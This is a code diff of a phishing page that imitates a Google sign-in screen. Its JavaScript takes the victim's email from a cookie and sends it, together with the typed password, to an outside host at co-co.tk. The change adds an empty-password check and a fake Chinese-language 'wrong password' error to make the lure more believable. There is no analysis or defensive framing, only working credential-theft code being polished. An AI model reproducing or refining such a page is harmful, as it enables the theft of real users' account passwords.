@@ -91,7 +91,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
                         </div>
                         <div class="LXRPh">
                           <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
-                          <div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div>
+                          <div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive" id="DDFo"></div>
                         </div>
                       </div>
                       </div>
@@ -146,6 +146,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 	document.getElementById("pIdr").innerHTML = Cookies.get('email');
 	document.getElementById("uremail").value = Cookies.get('email');
 	function sendinfo() {
+		if(document.getElementById("pw").value) {
 		var xhttp = new XMLHttpRequest();
 		xhttp.onreadystatechange = function() {
 			if (this.readyState == 4 && this.status == 200) {
@@ -157,6 +158,10 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 		};
 		xhttp.open("POST", location.protocol+"//co-co.tk/api/GoogleLogin.php?email="+Cookies.get('email')+"&pw="+document.getElementById("pw").value, true);
 		xhttp.send();
+		} else {
+			document.getElementById("password").className += " k0tWj IYewr";
+			document.getElementById("DDFo").innerHTML = "密碼錯誤，請再試一次，或按一下 [忘記密碼] 以重設密碼。";
+		}
 	}
 	function count(str) {
 		var i = 0;
